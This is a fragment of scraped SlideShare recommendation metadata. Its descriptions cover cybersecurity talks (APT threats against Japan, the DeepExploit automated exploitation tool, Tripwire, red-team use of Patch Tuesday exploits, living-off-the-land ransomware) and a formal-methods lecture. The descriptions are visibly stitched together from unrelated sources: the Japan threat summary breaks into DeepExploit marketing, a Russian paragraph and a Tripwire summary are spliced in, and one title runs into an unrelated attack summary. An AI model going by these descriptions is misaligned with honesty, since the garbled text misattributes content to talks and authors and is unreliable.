C...","isSavedByCurrentUser":false,"pageCount":72,"score":0.7005,"slideshowId":"204704689","sourceName":"ss_similarity","strippedTitle":"cb19-cyber-threat-landscape-in-japan-revealing-threat-in-the-shadow-by-chi-en-shen-ashley-oleg-bondarenko","thumbnail":"https://cdn.slidesharecdn.com/ss_thumbnails/japanthreatlandscape1030final-191212012938-thumbnail.jpg?width=600\u0026height=600\u0026fit=bounds","description":"For the past few years, Asia Pacific and Japan have continued to be a regular target of cyber threat actors. From 2018 to 2019, we have observed several threats targeting Japan involving cyber espionage and underground activities. Some of the adversaries and campaigns are revealed in OSINT, however, some are still lurking in shadow.\r\nIn this talk, we will reveal the TTP's (tactics, techniques and procedures) of espionage threat actors interested in Japanese electronics, chemical and 5G equipment manufacturing companies. One campaign leverages a malware attributed to APT41, a prolific Chinese cyber threat group that carries out state-sponsored espionage activity in parallel with financially motivated operations. Beside the Chinese actors, we have also observed a group which historically focused on the EMEA region shift to showing interest in Japan. It identifies the status of all opened ports on the target server and executes the exploit at pinpoint. DeepExploit’s key features are the following:\r\n\r\n1) Efficiently execute exploit:\r\nDeepExploit can execute exploits at pinpoint (minimum 1 attempt).\r\n\r\n2) Deep penetration:\r\nIf DeepExploit succeeds the exploit to the target server (=compromised server) with in the perimeter network, then it executes the exploit to internal servers via compromised server.\r\n\r\n3) Self-learning:\r\nDeepExploit can learn how to exploitation by itself.\r\n\r\nBy using our DeepExploit, you will benefit from the following:\r\n\r\nFor penetration testers:\r\n(a) They can greatly improve the test efficiency;\r\n(b) The more penetration testers use DeepExploit, DeepExploit learns how to method of exploitation using Deep Reinforcement learning. As a result, accuracy of test can be improved.\r\n\r\nFor Information Security Officers:\r\n(c) They can quickly identify vulnerabilities of own servers. As a result, prevent that attackers attack to your servers using vulnerabilities, and protect your reputation by avoiding the negative media coverage after breach.\r\nBecause attack methods to servers are evolving day by day, there is no guarantee that yesterday’s security countermeasures are safety today. Это направление объединяет научные работы, которые исследуют различные сценарии атак или мошенничества, анализируют вредоносные экосистемы, обнаруживают злоумышленников и изучает их методы с целью разработки эффективных мер противодействия. А также, показать, что подобные полезные исследования не всегда требует огромных ресурсов и сотрудничеств. The steps include: reducing evidence files, performing antivirus checks, searching for indicators of compromise, automated and manual memory analysis, checking for persistence mechanisms, entropy/packing analysis, reviewing event logs, timeline analysis, third-party hash lookups, and analyzing MFT and file time anomalies. It monitors key files and system attributes to detect changes from an established baseline. The summary is:\n\nTripwire monitors files and system attributes to detect unauthorized changes from a baseline. It works by creating a database of file attributes when first installed. It then regularly checks for changes and reports any differences found. System administrators can use reports to determine if changes were legitimate or require further action to restore system integrity. Tripwire provides host-based intrusion detection across networks and can help secure servers and other systems.","tags":["technical seminar"],"url":"https://www.slideshare.net/slideshow/20-tripwirepdf-251722521/251722521","userLogin":"gsr_anurag","userName":"G Srinu","viewCount":123}],"moreFromUser":[{"algorithmId":"","displayTitle":"Netwitness RT - Don’t scratch that patch.pptx","isSavedByCurrentUser":false,"pageCount":24,"score":0,"slideshowId":"261188596","sourceName":"MORE_FROM_USER","strippedTitle":"netwitness-rt-dont-scratch-that-patchpptx","thumbnail":"https://cdn.slidesharecdn.com/ss_thumbnails/netwitnessrt-dontscratchthatpatch-redist-230920092142-7f4719cc-thumbnail.jpg?width=600\u0026height=600\u0026fit=bounds","description":"With \"Patch Tuesday\" Microsoft usually addresses various security vulnerabilities and issues by providing patches and updates for their software products. However, for malicious actors, Patch Tuesday can be a valuable resource for identifying new exploits.\nIn time, noticing this mechanism in the cybercriminal ecosystem, we decided to adopt a similar approach to support our Red Team and our investigations. \nIn a nutshell we industrialized a process where our Threat Intel team harvest exploits linked with the Patch Tuesday from the dark web, while our team reverse engineer the updates looking for code we can use during our Red team activities. \nThe result is an extended set of potential exploits we can reliably integrate in our arsenal when we carry out the simulated attacks.\nThis improves the effectiveness of our Test and allow us to extend the options we have against the defense mechanisms of our customers. \nBy using the newly acquired knowledge about the vulnerabilities, the Red Team can test whether these systems can detect or prevent exploitation attempts.\nIn our session, we will present our process and some examples where our newly acquired knowledge and exploit allowed our team to better test our Customers cybersecurity posture.\n","tags":["cybersecurity","red-team","adversary-simulation"],"url":"https://www.slideshare.net/slideshow/netwitness-rt-dont-scratch-that-patchpptx/261188596","userLogin":"StefanoMaccaglia","userName":"Stefano Maccaglia","viewCount":139},{"algorithmId":"","displayTitle":"Insert coin to continue - It discusses how LotL attacks use legitimate system tools and functions rather than dropping files. Examples mentioned include using PowerShell scripts, macros, and registry entries to execute code. The document then describes a real-world ransomware attack attributed to the REvil group that impacted Kaseya software. The attack exploited a Kaseya server vulnerability to spread ransomware to Kaseya customers. It used living-off-the-land techniques like certutil.exe to download and execute a malicious payload without dropping files. [Martin Fränzle Festkolloquium, 2025]","isSavedByCurrentUser":false,"pageCount":71,"score":0,"slideshowId":"276310628","sourceName":"LATEST","strippedTitle":"formal-methods-whence-and-whither-martin-franzle-festkolloquium-2025","thumbnail":"https://cdn.slidesharecdn.com/ss_thumbnails/mf2025-250305164811-a0930761-thumbnail.jpg?width=600\u0026height=600\u0026fit=bounds","description":"Alan Turing arguably wrote the first paper on formal methods 75 years ago. Since then, there have been claims and counterclaims about formal methods. Tool development has been slow but aided by Moore’s Law with the increasing power of computers. Although formal methods are not widespread in practical usage at a heavyweight level, their influence as crept into software engineering practice to the extent that they are no longer necessarily called formal methods in their use. In addition, in areas where safety and security are important, with the increasing use of computers in such applications, formal methods are a viable way to improve the reliability of such software-based systems. Their use in hardware where a mistake can be very costly is also important. This talk explores the journey of formal methods to the present day and speculates on future directions.\n","tags":["formal methods","software engineering","computer science"],"url":"https://www.slideshare.net/slideshow/formal-methods-whence-and-whither-martin-franzle-festkolloquium-2025/276310628","userLogin":"jpbowen","userName":"Jonathan Bowen","viewCount":70},{"algorithmId":"4","displayTitle":"CFD Studio Credentials – Branding, Design \u0026 Development","isSavedByCurrentUser":false,"pageCount":39,"score":0,"slideshowId":"276603160","sourceName":"LATEST","strippedTitle":"cfd-studio-credentials-branding-design-development","thumbnail":"https://cdn.slidesharecdn.com/ss_thumbnails/credentials-cfd-studio-250312104550-92891163-thumbnail.jpg?width=600\u0026height=600\u0026fit=bounds","description":"CFD STUDIO is an independent creative studio, specializing in Branding, UX/UI Design, Website \u0026 Mobile App Development.
